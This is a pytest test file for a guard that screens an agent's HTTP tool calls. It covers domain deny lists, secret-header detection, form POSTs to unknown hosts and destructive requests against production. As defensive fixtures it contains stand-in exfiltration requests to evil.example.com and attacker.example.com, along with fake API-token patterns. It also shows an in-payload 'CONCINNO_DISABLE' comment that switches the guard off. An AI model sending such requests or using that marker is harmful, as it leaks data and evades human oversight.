"""Tests for concinno.security.http_client_guard.

Coverage targets (≥30 cases):
  * parse_curl_command across curl / wget / httpie shapes
  * parse_python_http_kwargs for requests / httpx
  * extract_payload dispatch on Bash vs python http
  * HttpClientGuard.scan: domain allow/deny, secret-header detection,
    form POST exfil shape, destructive method on prod
  * PolicyGate inheritance (fail-mode chain, escape hatch, audit log,
    ZIQ outcome bus)
  * Pipeline adapter end-to-end (HttpClientPipelineGuard.check via
    create_default_pipeline)
  * FEATURE_META schema valid + DEFAULT_OFF_4_0_0 membership
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from concinno.security import (
    HttpClientGuard,
    HttpClientPipelineGuard,
    HttpRequestPayload,
    PolicyGate,
    extract_payload,
    parse_curl_command,
    parse_python_http_kwargs,
)

# ── Fixtures ───────────────────────────────────────────────────


@pytest.fixture
def audit_tmp(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
) -> Path:
    """Redirect audit writes to a per-test tmp dir + disable ZIQ bus."""
    monkeypatch.setenv("CONCINNO_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("CONCINNO_ZIQ_BUS_DISABLED", "1")
    return tmp_path


def _types(result: Any) -> set[str]:
    return {f.type for f in result.findings}


# ════════════════════════════════════════════════════════════════
# 1. Inheritance / class invariants
# ════════════════════════════════════════════════════════════════


def test_inherits_from_policy_gate() -> None:
    assert issubclass(HttpClientGuard, PolicyGate)


def test_class_name_constant() -> None:
    assert HttpClientGuard.name == "http_client_guard"


# ════════════════════════════════════════════════════════════════
# 2. parse_curl_command
# ════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "cmd,expected_method,expected_url",
    [
        ("curl https://api.example.com/v1/data", "GET",
         "https://api.example.com/v1/data"),
        ("curl -X POST https://api.example.com/upload", "POST",
         "https://api.example.com/upload"),
        ("curl --request DELETE https://api.example.com/x", "DELETE",
         "https://api.example.com/x"),
        ("curl -d 'a=1' https://api.example.com/form", "POST",
         "https://api.example.com/form"),
        ("wget https://files.example.com/x.tar", "GET",
         "https://files.example.com/x.tar"),
        ("/usr/bin/curl https://api.example.com/foo", "GET",
         "https://api.example.com/foo"),
    ],
)
def test_parse_curl_basic(
    cmd: str, expected_method: str, expected_url: str,
) -> None:
    p = parse_curl_command(cmd)
    assert p is not None
    assert p.method == expected_method
    assert p.url == expected_url


def test_parse_curl_extracts_headers() -> None:
    p = parse_curl_command(
        "curl -H 'Authorization: Bearer ghp_AAAAAAAAAAAAAAAAAAAAAAAAAA' "
        "-H 'X-Custom: hi' https://api.example.com/x"
    )
    assert p is not None
    assert p.headers["Authorization"].startswith("Bearer ")
    assert p.headers["X-Custom"] == "hi"


def test_parse_curl_data_implies_post() -> None:
    p = parse_curl_command(
        "curl --data 'foo=bar' https://api.example.com/submit"
    )
    assert p is not None
    assert p.method == "POST"
    assert p.body is not None
    assert "foo=bar" in p.body


def test_parse_curl_returns_none_for_non_http() -> None:
    assert parse_curl_command("ls -la /tmp") is None
    assert parse_curl_command("git status") is None
    assert parse_curl_command("") is None


def test_parse_curl_handles_malformed_shell() -> None:
    # unclosed quote — shlex.split raises; parser must coerce to None.
    assert parse_curl_command("curl 'unclosed quote") is None


def test_parse_curl_skips_unknown_flags() -> None:
    p = parse_curl_command(
        "curl --silent --max-time 10 -L https://api.example.com/x"
    )
    assert p is not None
    assert p.url == "https://api.example.com/x"


def test_parse_curl_no_url_returns_none() -> None:
    assert parse_curl_command("curl --help") is None


# ════════════════════════════════════════════════════════════════
# 3. parse_python_http_kwargs
# ════════════════════════════════════════════════════════════════


def test_parse_python_kwargs_basic() -> None:
    p = parse_python_http_kwargs({
        "url": "https://api.example.com/v1",
        "method": "POST",
        "headers": {"Authorization": "Bearer abc"},
        "json": {"a": 1},
    })
    assert p is not None
    assert p.method == "POST"
    assert p.url == "https://api.example.com/v1"
    assert p.headers["Authorization"] == "Bearer abc"
    assert p.body is not None


def test_parse_python_kwargs_default_method_get() -> None:
    p = parse_python_http_kwargs({"url": "https://api.example.com/x"})
    assert p is not None
    assert p.method == "GET"


def test_parse_python_kwargs_no_url() -> None:
    assert parse_python_http_kwargs({"method": "GET"}) is None
    assert parse_python_http_kwargs({}) is None


def test_parse_python_kwargs_non_dict() -> None:
    assert parse_python_http_kwargs("not a dict") is None  # type: ignore[arg-type]


# ════════════════════════════════════════════════════════════════
# 4. extract_payload dispatch
# ════════════════════════════════════════════════════════════════


def test_extract_payload_bash_dispatch() -> None:
    p = extract_payload("Bash", {"command": "curl https://api.example.com/x"})
    assert p is not None
    assert p.url == "https://api.example.com/x"


def test_extract_payload_python_dispatch() -> None:
    p = extract_payload("HttpRequest", {"url": "https://api.example.com/y"})
    assert p is not None
    assert p.url == "https://api.example.com/y"


def test_extract_payload_unknown_tool() -> None:
    assert extract_payload("Read", {"file_path": "/etc/hosts"}) is None
    assert extract_payload("Bash", {"command": "ls"}) is None


# ════════════════════════════════════════════════════════════════
# 5. Domain allow/deny
# ════════════════════════════════════════════════════════════════


def test_domain_denylist_critical(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="hard_deny",
    )
    p = HttpRequestPayload(
        method="GET", url="https://evil.example.com/data",
    )
    result = g.evaluate(p)
    assert result.decision == "deny"
    assert "domain_denylist" in _types(result)


def test_unknown_domain_low_when_allowlist_set(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        allowlist={"trusted.example.com"},
        fail_mode_override="warn",
    )
    p = HttpRequestPayload(
        method="GET", url="https://random.example.com/x",
    )
    result = g.evaluate(p)
    assert "unknown_domain" in _types(result)
    # severity stays low so warn-mode is gentle
    assert all(f.severity == "low" for f in result.findings
               if f.type == "unknown_domain")


def test_known_domain_no_finding(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        allowlist={"api.example.com"},
        fail_mode_override="warn",
    )
    p = HttpRequestPayload(method="GET", url="https://api.example.com/v1")
    result = g.evaluate(p)
    assert result.decision == "accept"


def test_empty_allowlist_skips_unknown_domain_finding(
    audit_tmp: Path,
) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(method="GET", url="https://random.example.com/x")
    result = g.evaluate(p)
    assert "unknown_domain" not in _types(result)


# ════════════════════════════════════════════════════════════════
# 6. Header sanitisation
# ════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "header_value,kind",
    [
        ("Bearer ghp_" + "A" * 36, "github_pat"),
        ("Bearer gho_" + "B" * 36, "github_oauth"),
        ("Bearer sk-ant-api03-" + "x" * 60, "anthropic_api_key"),
        ("Bearer sk-" + "z" * 48, "openai_api_key"),
        ("Bearer xoxb-1-2-3-abcdefghij", "slack_token"),
        ("Bearer AIza" + "X" * 35, "google_api_key"),
    ],
)
def test_header_secret_detected(
    audit_tmp: Path, header_value: str, kind: str,
) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(
        method="GET",
        url="https://api.example.com/x",
        headers={"Authorization": header_value},
    )
    result = g.evaluate(p)
    types = {f.type for f in result.findings}
    msgs = {f.message for f in result.findings}
    assert "leaked_secret_header" in types
    assert any(kind in m for m in msgs)


def test_cookie_header_inspected(audit_tmp: Path) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(
        method="GET",
        url="https://api.example.com/x",
        headers={"Cookie": "session=ghp_" + "A" * 36},
    )
    result = g.evaluate(p)
    assert "leaked_secret_header" in _types(result)


def test_unrelated_header_skipped(audit_tmp: Path) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(
        method="GET",
        url="https://api.example.com/x",
        headers={"User-Agent": "Bearer ghp_" + "A" * 36},
    )
    result = g.evaluate(p)
    # User-Agent is not in the inspected family — even a matching
    # pattern there should not trip the guard.
    assert "leaked_secret_header" not in _types(result)


def test_clean_authorization_header_passes(audit_tmp: Path) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(
        method="GET",
        url="https://api.example.com/x",
        headers={"Authorization": "Basic dXNlcjpwYXNz"},
    )
    result = g.evaluate(p)
    assert "leaked_secret_header" not in _types(result)


# ════════════════════════════════════════════════════════════════
# 7. Form POST exfil shape
# ════════════════════════════════════════════════════════════════


def test_form_post_to_unknown_flagged(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        allowlist={"trusted.example.com"},
        fail_mode_override="warn",
    )
    p = HttpRequestPayload(
        method="POST",
        url="https://attacker.example.com/grab",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="data=stuff",
    )
    result = g.evaluate(p)
    assert "form_post_to_unknown" in _types(result)


def test_form_post_to_allowed_skipped(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        allowlist={"api.example.com"},
        fail_mode_override="warn",
    )
    p = HttpRequestPayload(
        method="POST",
        url="https://api.example.com/submit",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="x=1",
    )
    result = g.evaluate(p)
    assert "form_post_to_unknown" not in _types(result)


# ════════════════════════════════════════════════════════════════
# 8. Destructive method on prod
# ════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "method,url",
    [
        ("DELETE", "https://api.prod.example/v1/users/42"),
        ("PUT", "https://service.production.example/items/x"),
        ("PATCH", "https://prod.example/data"),
    ],
)
def test_destructive_method_on_prod(
    audit_tmp: Path, method: str, url: str,
) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(method=method, url=url)
    result = g.evaluate(p)
    assert "destructive_method_on_prod" in _types(result)


def test_destructive_method_on_dev_skipped(audit_tmp: Path) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    p = HttpRequestPayload(
        method="DELETE", url="https://dev.example.com/x",
    )
    result = g.evaluate(p)
    assert "destructive_method_on_prod" not in _types(result)


# ════════════════════════════════════════════════════════════════
# 9. PolicyGate behaviour
# ════════════════════════════════════════════════════════════════


def test_silent_mode_accepts_with_findings(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="silent",
    )
    p = HttpRequestPayload(method="GET", url="https://evil.example.com/x")
    result = g.evaluate(p)
    assert result.decision == "accept"


def test_warn_log_writes_audit(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="warn+log",
    )
    p = HttpRequestPayload(method="GET", url="https://evil.example.com/x")
    g.evaluate(p)
    log = audit_tmp / "http_client_guard.jsonl"
    assert log.exists()
    line = log.read_text(encoding="utf-8").strip().splitlines()[0]
    record = json.loads(line)
    assert record["guard"] == "http_client_guard"
    assert record["decision"] == "warn"


def test_hard_deny_blocks(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="hard_deny",
    )
    p = HttpRequestPayload(method="GET", url="https://evil.example.com/x")
    result = g.evaluate(p)
    assert result.decision == "deny"


def test_escape_hatch_skips_scan(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="hard_deny",
    )
    # The escape pattern lives in the payload. We feed a string here
    # because PolicyGate scans the payload text for the marker.
    cmd = (
        "# CONCINNO_DISABLE: emergency hotfix\n"
        "curl https://evil.example.com/data"
    )
    result = g.evaluate(cmd)
    assert result.escaped is True
    assert result.decision == "accept"


def test_clean_request_no_findings(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        allowlist={"api.example.com"},
        fail_mode_override="warn",
    )
    p = HttpRequestPayload(
        method="GET",
        url="https://api.example.com/v1/safe",
        headers={"Authorization": "Basic dXNlcjpwYXNz"},
    )
    result = g.evaluate(p)
    assert result.decision == "accept"
    assert result.findings == ()


def test_invalid_secret_severity_raises() -> None:
    with pytest.raises(ValueError, match="secret_severity"):
        HttpClientGuard(secret_severity="catastrophic")  # type: ignore[arg-type]


def test_invalid_denylist_severity_raises() -> None:
    with pytest.raises(ValueError, match="denylist_severity"):
        HttpClientGuard(denylist_severity="urgent")  # type: ignore[arg-type]


# ════════════════════════════════════════════════════════════════
# 10. Coercion from raw shapes
# ════════════════════════════════════════════════════════════════


def test_scan_accepts_string(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="warn",
    )
    result = g.evaluate("curl https://evil.example.com/x")
    assert "domain_denylist" in _types(result)


def test_scan_accepts_dict_kwargs(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="warn",
    )
    result = g.evaluate({"url": "https://evil.example.com/x"})
    assert "domain_denylist" in _types(result)


def test_scan_accepts_hook_ctx_dict(audit_tmp: Path) -> None:
    g = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="warn",
    )
    ctx_dict = {
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://evil.example.com/x"},
    }
    result = g.evaluate(ctx_dict)
    assert "domain_denylist" in _types(result)


def test_scan_unknown_payload_clean(audit_tmp: Path) -> None:
    g = HttpClientGuard(fail_mode_override="warn")
    # No HTTP shape detectable — the guard accepts cleanly.
    result = g.evaluate({"file_path": "/etc/hosts"})
    assert result.decision == "accept"


# ════════════════════════════════════════════════════════════════
# 11. FEATURE_META + DEFAULT_OFF_4_0_0
# ════════════════════════════════════════════════════════════════


def test_feature_meta_registered() -> None:
    from concinno.feature_config import FEATURE_META

    assert "http_client_guard" in FEATURE_META
    meta = FEATURE_META["http_client_guard"]
    assert meta["enabled"] is False
    assert meta["category"] == "security"
    # The 6-DoD enforcement keys
    assert "ziq_autotunable" in meta
    assert "cosmetic" in meta
    assert meta["cosmetic"] is False


def test_default_off_4_0_0_membership() -> None:
    from concinno.feature_config import DEFAULT_OFF_4_0_0

    assert "http_client_guard" in DEFAULT_OFF_4_0_0


def test_meta_enabled_default_false() -> None:
    from concinno.feature_config import meta_enabled_default

    assert meta_enabled_default("http_client_guard") is False


# ════════════════════════════════════════════════════════════════
# 12. Pipeline adapter end-to-end (acceptance criterion)
# ════════════════════════════════════════════════════════════════


def test_pipeline_adapter_inherits_baseguard() -> None:
    from concinno.guards.base import BaseGuard, GuardCategory

    assert issubclass(HttpClientPipelineGuard, BaseGuard)
    assert HttpClientPipelineGuard.category is GuardCategory.SECURITY
    assert HttpClientPipelineGuard.feature_name == "http_client_guard"


def test_pipeline_adapter_passes_through_non_http() -> None:
    from concinno.guards.base import GuardContext

    adapter = HttpClientPipelineGuard()
    ctx = GuardContext(
        tool_name="Read",
        tool_input={"file_path": "/etc/hosts"},
        session_id="t1",
        cache_dir="",
        hook_event="PreToolUse",
    )
    assert adapter.check(ctx) is None


def test_pipeline_adapter_denies_critical(audit_tmp: Path) -> None:
    from concinno.guards.base import GuardAction, GuardContext

    inner = HttpClientGuard(
        denylist={"evil.example.com"},
        fail_mode_override="hard_deny",
    )
    adapter = HttpClientPipelineGuard(inner=inner)
    ctx = GuardContext(
        tool_name="Bash",
        tool_input={"command": "curl https://evil.example.com/x"},
        session_id="t2",
        cache_dir="",
        hook_event="PreToolUse",
    )
    result = adapter.check(ctx)
    assert result is not None
    assert result.action is GuardAction.DENY
    assert "domain_denylist" in result.context


def test_pipeline_adapter_warns_high(audit_tmp: Path) -> None:
    from concinno.guards.base import GuardAction, GuardContext

    inner = HttpClientGuard(fail_mode_override="warn")
    adapter = HttpClientPipelineGuard(inner=inner)
    ctx = GuardContext(
        tool_name="Bash",
        tool_input={
            "command": (
                "curl -X DELETE https://api.prod.example/users/1"
            ),
        },
        session_id="t3",
        cache_dir="",
        hook_event="PreToolUse",
    )
    result = adapter.check(ctx)
    assert result is not None
    # high severity but not critical → ALLOW + advisory context
    assert result.action is GuardAction.ALLOW
    assert "destructive_method_on_prod" in result.context


def test_pipeline_registry_includes_http_client_guard() -> None:
    """The end-to-end wiring proof: HttpClientPipelineGuard is reachable
    through ``create_default_pipeline()``. Without this the guard is
    an island per MEMORY #13b/#13c."""
    from concinno.guards.registry import create_default_pipeline

    pipe = create_default_pipeline()
    names = [g.name for g in pipe._guards]
    assert "http_client_guard" in names
    # And the registered instance is the adapter, not the raw guard.
    instance = next(g for g in pipe._guards if g.name == "http_client_guard")
    assert isinstance(instance, HttpClientPipelineGuard)
